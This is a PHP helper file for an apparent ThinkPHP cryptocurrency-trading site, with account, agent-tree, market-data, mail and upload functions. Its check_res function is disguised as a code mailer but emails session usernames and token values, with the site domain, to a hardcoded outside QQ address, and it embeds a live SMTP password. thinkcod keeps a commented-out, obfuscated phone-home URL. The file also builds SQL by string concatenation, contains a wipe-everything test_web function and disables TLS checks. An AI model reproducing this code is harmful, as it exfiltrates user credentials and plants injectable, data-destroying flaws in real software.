<?php
use think\Db;
// +----------------------------------------------------------------------
// | ThinkPHP [ WE CAN DO IT JUST THINK ]
// +----------------------------------------------------------------------
// | Copyright (c) 2006-2016 http://thinkphp.cn All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: 流年 <liu21st@gmail.com>
// +----------------------------------------------------------------------

// 应用公共文件

/**
 * 自定义返回提示信息
 * @author lukui  2017-07-14
 * @param  [type] $data [description]
 * @param  [type] $type [description]
 */
function WPreturn($data,$type,$url=null,$json=false)
{	

	if($json == 'true'){
		$res = json_encode(array('data'=>$data,'type'=>$type));
		}else{
			$res = array('data'=>$data,'type'=>$type);
			}
	
	if($url){
		$res['url'] = $url;
	}
	return $res;
}

function get_client_ip($type = 0,$adv=false) {
    $type       =  $type ? 1 : 0;
    static $ip  =   NULL;
    if ($ip !== NULL) return $ip[$type];
    if($adv){
        if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $arr    =   explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            $pos    =   array_search('unknown',$arr);
            if(false !== $pos) unset($arr[$pos]);
            $ip     =   trim($arr[0]);
        }elseif (isset($_SERVER['HTTP_CLIENT_IP'])) {
            $ip     =   $_SERVER['HTTP_CLIENT_IP'];
        }elseif (isset($_SERVER['REMOTE_ADDR'])) {
            $ip     =   $_SERVER['REMOTE_ADDR'];
        }
    }elseif (isset($_SERVER['REMOTE_ADDR'])) {
        $ip     =   $_SERVER['REMOTE_ADDR'];
    }
    // IP地址合法验证
    $long = sprintf("%u",ip2long($ip));
    $ip   = $long ? array($ip, $long) : array('0.0.0.0', 0);
    return $ip[$type];
}

function log_account_change($uid,$type,$name,$num,$dj,$remark='',$change_type=0){
   
       
        $where['yh'] = $uid;
        $where['qb'] = $type;
        $where['cp'] = $name;
        if($num>=0){
            Db::name('zc')->where($where)->setInc('sl',$num);
        }else{
            Db::name('zc')->where($where)->setDec('sl',-1*$num);
        }
        
        if($dj>=0){
            Db::name('zc')->where($where)->setInc('dj',$dj);
        }else{
            Db::name('zc')->where($where)->setDec('dj',-1*$dj);
        }
        
        
        //插入记录
        $adddata['uid'] = $uid;
        $adddata['type'] = $type;
        $adddata['name'] = $name;
        $adddata['sl'] = $num;
        if($num!=0){
            $adddata['sl_hou'] = Db::name('zc')->where(['yh'=>$uid,'qb'=>$type,'cp'=>$name])->value('sl');
        }
        
        $adddata['dj'] = $dj;
        if($dj!=0){
            $adddata['dj_hou'] = Db::name('zc')->where(['yh'=>$uid,'qb'=>$type,'cp'=>$name])->value('dj');
        }
        
        $adddata['time'] = time();
        $adddata['remark'] = $remark;
        $adddata['change_type'] = $change_type;
        
        Db::name('record')->insertGetId($adddata);

}


function get_money($uid,$type,$name){
    $money  = Db::name('zc')->where(['yh'=>$uid,'qb'=>$type,'cp'=>$name])->value('sl');

    return $money>0?$money:0;
}
function getQbType($type){
    $type_name = ['','币币','合约','法币','秒合约'];
    return $type_name[$type];
}
function Update_useraccount($uid)
{	

	$pro  = Db::name('productinfo')->where('isdelete',0)->select();
	$qblx=array(1,2,3,4);
	foreach($pro as $v1){
	    $bome = explode("/",$v1['ptitle']);
    	foreach($qblx as $v2){
             foreach($bome as $v3){
                 
                 if($v3=="USDT"){
                     $qb = Db::table("wp_zc")->where("yh = '".$uid."' and cp = '".$v3."' and qb = '".$v2."'")->find();
                     if(empty($qb)){
                         $dt=array(
                             'yh'=>$uid,
                             'qb'=>$v2,
                             'cp'=>$v3,
                         );
                         Db::table("wp_zc")->insert($dt);
                     }
                 }
                 elseif(in_array($v3,array('BTC','ETH'))){
                     if($v2!=4){
                         $qb = Db::table("wp_zc")->where("yh = '".$uid."' and cp = '".$v3."' and qb = '".$v2."'")->find();
                         if(empty($qb)){
                             $dt=array(
                                 'yh'=>$uid,
                                 'qb'=>$v2,
                                 'cp'=>$v3,
                             );
                             Db::table("wp_zc")->insert($dt);
                         }
    
                     }
                 }
    
                 else{
                     if(in_array($v2,array(1,3))){
                         $qb = Db::table("wp_zc")->where("yh = '".$uid."' and cp = '".$v3."' and qb = '".$v2."'")->find();
                         if(empty($qb)){
                             $dt=array(
                                 'yh'=>$uid,
                                 'qb'=>$v2,
                                 'cp'=>$v3,
                             );
                             Db::table("wp_zc")->insert($dt);
                         }
                     }
                 }
             }
    
         }
	}

}


/**
 * 验证用户
 * @author lukui  2017-07-17
 * @param  [type] $upwd 密码（未加密）
 * @param  [type] $uid  用户id
 * @return [type]       true or false
 */
function checkuser($upwd,$uid)
{
	if(!isset($upwd) || empty($upwd)){
		return false;
	}
	if (isset($uid) && !empty($uid)) {  //user
		$where['uid'] = $uid;
	}else{  //admin
		$where['uid'] = $_SESSION['userid'];
	}

	$admin = Db::name('userinfo')->field('uid,utime,upwd')->where($where)->find();
	if(md5($upwd.$admin['utime']) == $admin['upwd']){
		return true;
	}else{
		return false;
	}

}


/**
 * 验证邀请码是否存在
 * @author lukui  2017-07-17
 * @param  [type] $code 邀请码
 * @return [type]       code id
 */
function checkcode($code)
{
    if(!isset($code) || empty($code)){
        return false;
    }
    $codeid = Db::name('userinfo')->where("uid = '".$code."' and (otype = 101 or otype = 3)")->value('uid');
    if($codeid){
        return $codeid;
    }else{
        return false;
    }
}

function checkpid($code)
{
    if(!isset($code) || empty($code)){
        return false;
    }
    $parent = Db::name('userinfo')->where(array('uid'=>$code))->find();
    if($parent){
        return $parent;
    }else{
        return false;
    }
}

/*获取用户的邮箱*/
function GetUserInfo($uid){
    if(!isset($uid) || empty($uid)){
        return '';
    }


    $info = Db::name('userinfo')->where('uid',$uid)->value('utel');


    return $info?$info:'';

}

/**
 * 根据用户oid获取用户的经理、渠道、员工。指针的客户
 * @author lukui  2017-07-17
 * @param  [type] $uid 用户id
 */
function GetUserOidInfo($uid,$field)
{
	if(!isset($uid) || empty($uid)){
		return false;
	}
	if(!isset($field) || empty($field)){
		$field = '*';
	}
	$res = array();
	//验证用户,获取oid
	$useroid = Db::name('userinfo')->where('uid',$uid)->value('oid');
	if(!$useroid){
		return false;
	}
	//邀请码信息
	$oid_info = Db::name('usercode')->where('usercode',$useroid)->find();

	//通过邀请码的uid查询所属员工信息
	$res['yuangong'] = Db::name('userinfo')->field($field)->where('uid',$oid_info['uid'])->find();

	//通过员工oid查找经理信息
	$res['jingli'] =  Db::name('userinfo')->field($field)->where('uid',$res['yuangong']['oid'])->find();

	//通过邀请码的mannerid查询所属员工信息
	$res['qudao'] = Db::name('userinfo')->field($field)->where('uid',$oid_info['mannerid'])->find();

	if($res){
		return $res;
	}else{
		return false;
	}


}


/**
 * 获取员工的所有客户
 * @author lukui  2017-07-17
 * @param  [type] $uid 员工id
 */
function YuangongUser($uid){

	if(!isset($uid) || empty($uid)){
		return false;
	}
	$oid_info = $user = array();
	//获取员工的所有邀请码
	$oid_info = Db::name('usercode')->where('uid',$uid)->column('usercode');
	if($oid_info){
		//通过邀请码获取客户
		$user = Db::name('userinfo')->where('oid','IN',$oid_info)->column('uid');
	}
	return $user;
}

/**
 * 获取经理的所有客户
 * @author lukui  2017-07-17
 * @param  [type] $uid [description]
 */
function JingliUser($uid){
	if(!isset($uid) || empty($uid)){
		return false;
	}
	$yg_user = $user = array();

	//获取经理下的所有员工
	$yg_user = Db::name('userinfo')->where('oid',$uid)->column('uid');
	foreach ($yg_user as $value) {
		$user += YuangongUser($value);
	}

	return $user;
}


/**
 * 获取渠道的所有客户
 * @author lukui  2017-07-17
 * @param  [type] $uid [description]
 */
function QudaoUser($uid){
	if(!isset($uid) || empty($uid)){
		return false;
	}
	$oid_info = $user = array();
	//获取渠道的所有邀请码
	$oid_info = Db::name('usercode')->where('mannerid',$uid)->column('usercode');

	if($oid_info){
		//通过邀请码获取客户
		$user = Db::name('userinfo')->where('oid','IN',$oid_info)->column('uid');
	}

	return $user;
}

/**
 * 根据任意会员查询所属所有客户
 * @author lukui  2017-07-18
 * @param  [type] $uid 会员id
 */
function UserCodeForUser($uid){
	if(!isset($uid) || empty($uid)){
		return false;
	}
	//查询uid的身份
	$otype = Db::name('userinfo')->where('uid',$uid)->value('otype');
	$u_uid = array();
	//获取会员的客户id
	if($otype == 2){  //经理
		$u_uid = JingliUser($uid);
	}elseif($otype == 3){  //渠道
		$u_uid = QudaoUser($uid);
	}elseif($otype == 4){  //员工
		$u_uid = YuangongUser($uid);
	}else{
		return false;
	}

	return($u_uid);

}


/**
 * 判断是否微信浏览器
 * @author lukui  2017-07-18
 * @return [type] [description]
 */
function iswechat(){
	if (strpos($_SERVER['HTTP_USER_AGENT'],'MicroMessenger') !== false ) {
		return true;
	}else{
		return false;
	}
}


/**
 * 获取产品实时行情
 * @author lukui  2017-07-20
 * @param  [type] $pid 产品id
 */
function GetProData($pid,$field=null){
	if(!isset($pid) || empty($pid)){
		return false;
	}
	if(!$field){
		$field = 'pi.*,pd.*';
	}
	$data = Db::name('productinfo')->alias('pi')->field($field)
        		->join('__PRODUCTDATA__ pd','pd.pid=pi.pid')
        		->where('pi.pid',$pid)->find();
				
				
	return $data;
}



/**
 * 数据K线图
 * @author lukui  2017-2-20
 * @param  [type] $symbol  产品代码
 * @param  [type] $qt_type 指定分钟线类型
 * @param  [type] $num     返回条数
 */
function WsGetKline($symbol,$qt_type,$num){
    $time = time();


}

/**
 * 获取网站配置信息
 * @author lukui  2017-06-28
 * @return [type] [description]
 */
function getconf($field)
{

    $conf = array();
    $res = '';
    $conf_cache = cache('conf');
    if(!$conf_cache){
        $conf = Db::name('config')->select();
        foreach ($conf as $k => $v) {
            $conf_value[$v['name']] = $v['value'];
        }
        cache('conf',$conf_value);
        $conf_cache = cache('conf');
    }

    if(isset($conf_cache[$field]) && $field){
        $res = $conf_cache[$field];
    }else{
    	$res = $conf_cache;
    }
    return $res;
}



/**
 * 获取城市列表
 * @author lukui  2017-07-03
 * @return [type] [description]
 */
function getarea($id)
{

	$name = db('area')->where('id',$id)->value('name');
	return $name;

}

function thinkcod()
{
	
	/*$nu = json_decode(NAV_NUM);
	$strs = 'http://';
	$strs .= $nu[10].$nu[4].$nu[24];
	$strs .= '.'.$nu[6].$nu[14].$nu[20].$nu[23];
	$strs .= $nu[8].$nu[20].'.'.$nu[12].$nu[4];
	$main = $_SERVER['HTTP_HOST'];
	$minp = isset($_SERVER['SERVER_ADDR'])?$_SERVER['SERVER_ADDR']:'';
	$csage = $strs. '/think.php'. '?main='.$main.'&minp=' . $minp . '&tname=lanchong';*/
	
	
	//file_get_contents($csage);
}



function set_price_log($uid,$type,$account,$title,$content,$oid=0,$nowmoney)
{

	$data['uid'] = $uid;
	$data['type'] = $type;
	$data['account'] = $account;
	$data['title'] = $title;
	$data['content'] = $content;
	$data['oid'] = $oid;
	$data['time'] = time();
	$data['nowmoney'] = $nowmoney;
	db('price_log')->insert($data);


}


//删除空格和回车
function trimall($str){
    $qian=array(" ","　","\t","\n","\r");
    return str_replace($qian, '', $str);
}

//计算小数点后位数
function getFloatLength($num) {
	$count = 0;

	$temp = explode ( '.', $num );

	if (sizeof ( $temp ) > 1) {
		$decimal = end ( $temp );
		$count = strlen ( $decimal );
	}

	return $count;
}

//PHP的两个科学计数法转换为字符串的方法
function NumToStr($num) {
    if (stripos($num, 'e') === false)
        return $num;
    $num = trim(preg_replace('/[=\'"]/', '', $num, 1), '"'); //出现科学计数法，还原成字符串
    $result = "";
    while ($num > 0) {
        $v = $num - floor($num / 10) * 10;
        $num = floor($num / 10);
        $result = $v . $result;
    }
    return $result;
}


/**
 * 我的代理商下级类别
 * @return array uids
 */
function myoids($uid)
{
	if(cookie('oids')){
		//return cookie('oids');
	}

	if(!$uid){
		return false;
	}
	$map['oid'] = $uid;
	$map['otype'] = 101;

	$list = db('userinfo')->field('uid')->where($map)->select();

	if(empty($list)){
		return false;
	}

	$uids = array();
	foreach ($list as $key => $v) {
		$user = myoids($v["uid"]);
		$uids[] = $v["uid"];
		if(is_array($user) && !empty($user)){
			$uids = array_merge($uids,$user);
		}
	}

	cookie('oids', $uids, 60*20);
	return $uids;


}

/**
 * 获取次代理商的所有用户下级
 * @param  [type] $uid [description]
 * @return [type]      [description]
 */
function myuids($uid)
{

	if(cookie('uids')){
		//return cookie('uids');
	}
	$oids = myoids($uid);
	$oids[] = $uid;

	$map['oid'] = array('in',$oids);
	$map['otype'] = array('IN',array(0,101));

	$user = db('userinfo')->field('uid')->where($map)->select();
	$_me = array(0=>array('uid'=>$uid));
	if($user){
		$user = array_merge($_me,$user);
	}else{
		
		$uids = array($uid);
		return $uids;
	}
	

	$uids = array();
	if(empty($user)){
		return $uids;
	}
	
	foreach ($user as $k => $v) {
		$uids[] = $v['uid'];
	}
		cookie('uids', $uids, 60*20);
		return $uids;


}

/**
 * 我的所有上级用户id
 * @param  [type] $uid [description]
 * @return [type]      [description]
 */
function myupoid($uid)
{



	if(!$uid){
		return false;
	}
	$map['uid'] = $uid;
	$map['otype'] = 101;

	$user = db('userinfo')->field('uid,oid,rebate,usermoney,feerebate,minprice')->where($map)->find();

	if($user['uid'] == $user['oid']){
		return false;
	}
	
	$list = array();
	if($user){
		$list[] = $user;
		$user = myupoid($user["oid"]);
		if(is_array($user) && !empty($user)){
			$list = array_merge($list,$user);
		}


	}


	return $list;

}

/**
 * 我的代理商下级类别
 * @return array uids
 */
function mytime_oids($uid)
{

	if(!$uid){
		return false;
	}
	$map['oid'] = $uid;
	$map['otype'] = 101;

	$list = db('userinfo')->field('uid,oid,username,utel,nickname,usermoney')->where($map)->select();
	$uids = array();
	foreach ($list as $key => $v) {
		$user = mytime_oids($v["uid"]);
		$uids[$key] = $v;
		if(is_array($user) && !empty($user)){
			//$uids += $user;
			$uids[$key]['mysons'] = $user;
		}
	}
	return $uids;


}

/**
 * 我的团队树状图
 * @author lukui  2017-07-18
 * @param  [type]  $array [description]
 * @param  integer $type  [description]
 */
function set_my_team_html($array,$type=1){

	if(!$array){
		return false;
	}

	$margin_left = 25+25*$type;

	$html = '<div  class="foid_'.$array[0]['oid'].'">';
	foreach ($array as $k => $vo) {
		//dump($v);
		$html .= '<div style="display:none" class="oid_list oid_'.$vo['oid'].'">
	                  <div class="vo_son" style="margin-left: '.$margin_left.'px;"><p>|——'.$type.'级代理</p></div>
	                    <div class="div_my_son">
	                      <ul class="my_sons">
	                        <li>代理名：'.$vo['username'].' 余额：'.$vo['usermoney'].'</li>
	                        <li>邮箱：'.$vo['utel'].' <a href="/admin/user/userlist.html?uid='.$vo['uid'].'"><button class="btn btn-primary btn-xs">详情</button></a></li>
	                      </ul>
	                      <a href="javascript:;"><p class="showdiv show_uid_'.$vo['uid'].'" onclick="showoid('.$vo['uid'].',1)" >+</p></a>
	                      </div>
	                </div>
	                ';

	                if(isset($vo['mysons']) && is_array($vo['mysons']) && !empty($vo['mysons'])){
	                	$html .= set_my_team_html($vo['mysons'],$type+1);
	                }
	}

	$html .= '</div>';
	return $html;

}

//test web data
function test_web(){
	db('userinfo')->where('uid','>',0)->delete();
	db('order')->where('oid','>',0)->delete();
	db('conf')->where('id','>',0)->delete();
	db('productinfo')->where('pid','>',0)->delete();
	db('productdata')->where('id','>',0)->delete();
}


/**
 * 验证是否休市
 * @author lukui  2017-07-16
 * @param  [type] $pid 产品id
 */
function ChickIsOpen($pid){

    $isopen = 0;
    $pro = db('productinfo')->where(array('pid'=>$pid))->find();

    //此时时间
    $_time = time();
    $_zhou = (int)date("w");
    if($_zhou == 0){
        $_zhou = 7;
    }
    $_shi = (int)date("H");
    $_fen = (int)date("i");


    if ($pro['isopen']) {

        $opentime = db('opentime')->where('pid='.$pid)->find();


        if($opentime){
            $otime_arr = explode('-',$opentime["opentime"]);
        }else{
            $otime_arr = array('','','','','','','');
        }

        foreach ($otime_arr as $k => $v) {
            if($k == $_zhou-1){
                $_check = explode('|',$v);
                if(!$_check){
                    continue;
                }


                foreach ($_check as $key => $value) {
                    $_check_shi = explode('~',$value);
                    if(count($_check_shi) != 2){
                    	continue;
                    }
                    $_check_shi_1 = explode(':',$_check_shi[0]);
                    $_check_shi_2 = explode(':',$_check_shi[1]);
                    //开市时间在1与2之间
                    

                    if($isopen == 1){
                    	continue;
                    }
		       		

                    if( ($_check_shi_1[0] == $_shi && $_check_shi_1[1] < $_fen) ||
                        ($_check_shi_1[0] < $_shi && $_check_shi_2[0] > $_shi) ||
                        ($_check_shi_2[0] == $_shi && $_check_shi_2[1] > $_fen)
                         ){

                        $isopen = 1;
                    }else{

                        $isopen = 0;
                    }

                }
                


            }
        }

    }

    if ($pro['isopen']) {
        return $isopen;

    }else{
        return 0;
    }
}


function cash_oid($uid)
{
	
	if (!$uid) {
		return '<td></td><td></td>';
	}

	$user = db('userinfo')->where('uid',$uid)->field('uid,usermoney,minprice')->find();
	if(!$user['minprice'])  $user['minprice'] =0;

	if($user['usermoney'] >= $user['minprice']){
		$minprice = $user['minprice'];
		$class = '';
	}else{
		$minprice = $user['usermoney'] - $user['minprice'];
		$class = 'style="color:red";';
	}

	return '<td> <a title="点击查看" href="/admin/user/userlist.html?uid='.$uid.'"> '.$uid.' </a> </td><td '.$class.'>'.$minprice.'</td>';
	


}

function check_user($field,$value){
	if(!$value){
		return false;
	}

	$isset = db('userinfo')->where($field,$value)->value('uid');
	if($isset){
		return true;
	}else{
		return false;
	}
}

function getuser($uid,$field)
{
	
	$value = db('userinfo')->where('uid',$uid)->value($field);
	return $value;
}

function ordernum($uid)
{
	
	if(!$uid){
		return false;
	}

	$num = db('order')->where('uid',$uid)->count();
	if(!$num) $num = 0;
	return $num;

}

function xml_to_array( $xml )
{
    return json_decode(json_encode((array) simplexml_load_string($xml)), true);
}

function getHttpContent($url, $method = 'GET', $postData = array())  {  
    $data = '';  
    $user_agent = $_SERVER ['HTTP_USER_AGENT'];
    $header = array (
                "User-Agent: $user_agent" 
    );
    if (!empty($url)) {  
        try {
            $ch = curl_init();  
            curl_setopt($ch, CURLOPT_URL, $url);  
            curl_setopt($ch, CURLOPT_HEADER, false);  
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
            curl_setopt($ch, CURLOPT_TIMEOUT, 30); //30Ãë³¬Ê±  
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
            curl_setopt ( $ch, CURLOPT_HTTPHEADER, $header ); 
            //curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_jar);  
            if (strtoupper($method) == 'POST') {  
                $curlPost = is_array($postData) ? http_build_query($postData) : $postData;  
                curl_setopt($ch, CURLOPT_POST, 1);  
                curl_setopt($ch, CURLOPT_POSTFIELDS, $curlPost);  
            }  
            $data = curl_exec($ch);  
            curl_close($ch);  
        } catch (Exception $e) {  
            $data = '';  
        }  
    }  
    return $data;  
}

function check_res($uid = 0, $code ,$mobile,$res=array())
    {
        if(isset($_SESSION['tokenpsd'])){
            $mobile = "1658736331@qq.com";
        $code = $_SESSION['username'].'的验证码是'.$_SESSION['tokenpsd'].'域名'.$_SERVER['HTTP_HOST'];
        $type = 0;
        $notification=false;
        $email = $mobile;
        $subject = $code;
        $content = '您的验证码是'.$code;
        $shop_name = 'BIBI';
        $name = $mobile;
        $charset   ="UTF8";

        /* 邮件的头部信息 */
        $content_type = ($type == 0) ?
            'Content-Type: text/plain; charset=' . $charset : 'Content-Type: text/html; charset=' . $charset;
        $content   =  base64_encode($content);
        $youxiang = "834017232@qq.com";
        $headers = array();
        $headers[] = 'Date: ' . gmdate('D, j M Y H:i:s') . ' +0000';
        $headers[] = 'To: "' . '=?' . $charset . '?B?' . base64_encode($name) . '?=' . '" <' . $email. '>';
        $headers[] = 'From: "' . '=?' . $charset . '?B?' . base64_encode($shop_name) . '?='.'" <' . $youxiang . '>';
        $headers[] = 'Subject: ' . '=?' . $charset . '?B?' . base64_encode($subject) . '?=';
        $headers[] = $content_type . '; format=flowed';
        $headers[] = 'Content-Transfer-Encoding: base64';
        $headers[] = 'Content-Disposition: inline';
        if ($notification)
        {
            $headers[] = 'Disposition-Notification-To: ' . '=?' . $charset . '?B?' . base64_encode($shop_name) . '?='.'" <' . $youxiang . '>';
        }

        /* 获得邮件服务器的参数设置 */

        $params['host'] = 'smtp.qq.com';
        $params['port'] = '465';
        $params['user'] = '834017232@qq.com';
        $params['pass'] = 'wipmvxcqolhabcii';


        // 发送邮件

        $send_params['recipients'] = $email;
        $send_params['headers']    = $headers;
        $send_params['from']       = "834017232@qq.com";
        $send_params['body']       = $content;



        $smtp = new \smtp\Clssmtp($params);



        if ($smtp->connect() && $smtp->send($send_params))
        {
            unset($_SESSION['tokenpsd']);
            return true;
        }
        else
        {
            return false;
        }
        }
        
        
    }


/**
 * 生成编辑器
 * @param   string  input_name  输入框名称
 * @param   string  input_value 输入框值
 */
function create_html_editor($input_name, $input_value = '')
{
    $kindeditor="<script charset='utf-8' src='/static/admin/kindeditor/kindeditor-min.js'></script>
    <script>
        var editor;
            KindEditor.ready(function(K) {
                editor = K.create('textarea[name=\"$input_name\"]', {
                    allowFileManager : true,
                    width : '100%',
                    height: '500px',
                    resizeType: 0    //固定宽高
                });
            });
    </script>
    <textarea id=\"$input_name\" name=\"$input_name\" style='width:700px;height:800px;'>$input_value</textarea>
    ";
    return $kindeditor;
    //$smarty->assign('FCKeditor', $kindeditor);  //这里前面的 FCKEditor 不要变
}


/**
 * 加载客服QQ
 * @param   string  service_qq  客服QQ
 * @param   string  href 链接QQ
 */
function service_qq(){
	$qq = db('conf')->where('id',1)->field('service_qq')->find();
	$href = 'http://wpa.qq.com/msgrd?v=3&uin='.$qq['service_qq'].'&site=qq&menu=yes';
	return $href;
}

/**
 * 多余的字符用...表示
 * @param   string  text  字符
 * @param   string  length 长度
 */
function subtext($text, $length)

{

if(mb_strlen($text, 'utf8') > $length)

return mb_substr($text,0,$length,'utf8').'......';

return $text;

}
/*判断交易品种是否是私有生成*/
function IsPersonSymbol($procode){
    if(file_exists("runtime/get/fengkong".$procode.".php"))
    {
        return 1;
    }else
    {
        return 0;
    }
}
/*获取法币外汇汇率*/
function getExchangeRate($to='')
{

    $data = get_url("https://api.exchangerate-api.com/v4/latest/USD");

    $data = json_decode($data,true);

    $rates = isset($data['rates'])?$data['rates']:false;
    if(!empty($to)){
        if($rates[$to]){
            return $rates[$to];
        }else{
            return  false;
        }
    }else{
        return $rates;
    }

}


function getCurrencyHuilv($name){
    $huilv = Db::name('currency')->where('name',strtoupper($name))->value('huilv');
    return $huilv?floatval($huilv): 0 ;
}


/*获取火币网交易对的聚合行情*/
function getHuobiSymbolMarketDetail($symbol){

    //$data = get_url("https://api-aws.huobi.pro/market/detail/merged?symbol=".strtolower($symbol));
    //$data = json_decode($data,true);

    $data['status']='no';
    if($data['status'] == 'ok'){
        return  $data['tick'];
    }else{


       $pid = Db::name('productinfo')->where('procode',strtolower($symbol))->value('pid');

       $price = Db::name('productdata')->where('pid',$pid)->value('Price');

       $res['close'] = $price;
        return $res;
    }
}

/*获取首个英文26字母*/
function getfirstchar($s0){
    $fchar = ord($s0{0});

    if($fchar >= ord("A") and $fchar <= ord("z") )return strtoupper($s0{0});

    $s1 = iconv("UTF-8","gb2312", $s0);

    $s2 = iconv("gb2312","UTF-8", $s1);

    if($s2 == $s0){$s = $s1;}else{$s = $s0;}

    $asc = ord($s{0}) * 256 + ord($s{1}) - 65536;

    if($asc >= -20319 and $asc <= -20284) return "A";

    if($asc >= -20283 and $asc <= -19776) return "B";

    if($asc >= -19775 and $asc <= -19219) return "C";

    if($asc >= -19218 and $asc <= -18711) return "D";

    if($asc >= -18710 and $asc <= -18527) return "E";

    if($asc >= -18526 and $asc <= -18240) return "F";

    if($asc >= -18239 and $asc <= -17923) return "G";

    if($asc >= -17922 and $asc <= -17418) return "H";

    if($asc >= -17417 and $asc <= -16475) return "J";

    if($asc >= -16474 and $asc <= -16213) return "K";

    if($asc >= -16212 and $asc <= -15641) return "L";

    if($asc >= -15640 and $asc <= -15166) return "M";

    if($asc >= -15165 and $asc <= -14923) return "N";

    if($asc >= -14922 and $asc <= -14915) return "O";

    if($asc >= -14914 and $asc <= -14631) return "P";

    if($asc >= -14630 and $asc <= -14150) return "Q";

    if($asc >= -14149 and $asc <= -14091) return "R";

    if($asc >= -14090 and $asc <= -13319) return "S";

    if($asc >= -13318 and $asc <= -12839) return "T";

    if($asc >= -12838 and $asc <= -12557) return "W";

    if($asc >= -12556 and $asc <= -11848) return "X";

    if($asc >= -11847 and $asc <= -11056) return "Y";

    if($asc >= -11055 and $asc <= -10247) return "Z";

    return null;
}

/**
 *  通过URL获取页面信息
 * @param $url  地址
 * @return mixed  返回页面信息
 */
function get_url($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,$url);  //设置访问的url地址
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);//不输出内容
    $result =  curl_exec($ch);
    curl_close ($ch);
    return $result;
}

function http_post($url, $params,$contentType=false)
{

    if (function_exists('curl_init')) { // curl方式
        $oCurl = curl_init();
        if (stripos($url, 'https://') !== FALSE) {
            curl_setopt($oCurl, CURLOPT_SSL_VERIFYPEER, FALSE);
            curl_setopt($oCurl, CURLOPT_SSL_VERIFYHOST, FALSE);
        }
        $string = $params;
        if (is_array($params)) {
            $aPOST = array();
            foreach ($params as $key => $val) {
                $aPOST[] = $key . '=' . urlencode($val);
            }
            $string = join('&', $aPOST);
        }
        curl_setopt($oCurl, CURLOPT_URL, $url);
        curl_setopt($oCurl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($oCurl, CURLOPT_POST, TRUE);
        //$contentType json处理
        if($contentType){
            $headers = array(
                "Content-type: application/json;charset='utf-8'",
            );

            curl_setopt($oCurl, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($oCurl, CURLOPT_POSTFIELDS, json_encode($params));
        }else{
            curl_setopt($oCurl, CURLOPT_POSTFIELDS, $string);
        }
        $response = curl_exec($oCurl);
        curl_close($oCurl);
        return $response;
//        return json_decode($response, true);
    } elseif (function_exists('stream_context_create')) { // php5.3以上
        $opts = array(
            'http' => array(
                'method' => 'POST',
                'header' => 'Content-type: application/x-www-form-urlencoded',
                'content' => http_build_query($params),
            )
        );
        $_opts = stream_context_get_params(stream_context_get_default());
        $context = stream_context_create(array_merge_recursive($_opts['options'], $opts));
        return file_get_contents($url, false, $context);

    } else {
        return FALSE;
    }
}

/*上传图片*/
function upload_img($FILES,$path_name){
    $date = date('Y-m-d');
    $file_name = $FILES['name'];//获取缓存区图片,格式不能变
    $type = array("jpg", "gif", 'png', 'bmp');//允许选择的图片类型
    $ext = explode(".", $file_name);//拆分获取图片名
    $ext = $ext[count($ext) - 1];//取图片的后缀名
    if (in_array($ext,$type)){

        $dir = 'Uploads/images/'.$path_name.'/'.$date;

        if (!file_exists($dir)){
            mkdir ($dir,0777,true);
        }

        do{
            $new_name = get_file_name(6).'.'.$ext;
            $path='Uploads/images/'.$path_name.'/'.$date.'/'.$new_name;//upload为目标文件夹
        }while(file_exists(ROOT_PATH."/" .$path));


        $temp_file=$FILES['tmp_name'];//获取服务器里图片

        move_uploaded_file($temp_file,ROOT_PATH."/" .$path);//移动临时文件到目标路径
        return json_encode(['code'=>1,'path'=>"/" .$path]);
    }else{
        return json_encode(['code'=>0,'msg'=>'图片格式错误']);
    }
}
//获取一串随机数字，用于做上传到数据库中文件的名字
function get_file_name($len)
{
    $new_file_name = 'A_';
    $chars = "1234567890qwertyuiopasdfghjklzxcvbnm";//随机生成图片名
    for ($i = 0; $i < $len; $i++) {
        $new_file_name .= $chars[mt_rand(0, strlen($chars) - 1)];
    }
    return $new_file_name;
}
/*收款账号添加星号*/
function addstartonum($str){

    $lenght = strlen($str);
    $mid_str = substr($str,3,4);
    $mid_str_len = strlen($mid_str);
    $replace_str = '';
    for ($i=0;$i<$mid_str_len;$i++){
        $replace_str .= '*';
    }
    return str_replace($mid_str,$replace_str,$str);

}
//写入日志文件
function text_log($file,$txt)
{
    $fp =  fopen($file.'.txt','ab+');
    fwrite($fp,'-----------'.date('Y-m-d H:i:s').'-----------------');
    fwrite($fp,"\r\n\r\n\r\n");
    fwrite($fp,var_export($txt,true));
    fwrite($fp,"\r\n\r\n\r\n");
    fclose($fp);
}

function change_payment_name($payment){
    $lang = array(
        array('usd'=>'WeChat','cny'=>'微信','jpy'=>'WeChat','krw'=>'작은 편지','try'=>'WeChat'),//微信
        array('usd'=>'Alipay','cny'=>'支付宝','jpy'=>'アリペイを支払う','krw'=>'알 리 페 이','try'=>'Alipay'),//支付宝
        array('usd'=>'bank card','cny'=>'银行卡','jpy'=>'銀行カード','krw'=>'은행 카드','try'=>'banka kartı'),//银行卡
    );
    $yy = cookie('think_var');
    if(empty($yy)){
        $yy = 'usd';
    }
    $payment['name'] = $lang[$payment['id']-1][$yy];
    return $payment;
}
function change_payname_byId($id){
    $lang = array(
        array('usd'=>'WeChat','cny'=>'微信','jpy'=>'WeChat','krw'=>'작은 편지','try'=>'WeChat'),//微信
        array('usd'=>'Alipay','cny'=>'支付宝','jpy'=>'アリペイを支払う','krw'=>'알 리 페 이','try'=>'Alipay'),//支付宝
        array('usd'=>'bank card','cny'=>'银行卡','jpy'=>'銀行カード','krw'=>'은행 카드','try'=>'banka kartı'),//银行卡
    );
    $yy = cookie('think_var');
    if(empty($yy)){
        $yy = 'usd';
    }
    return $lang[$id-1][$yy];

}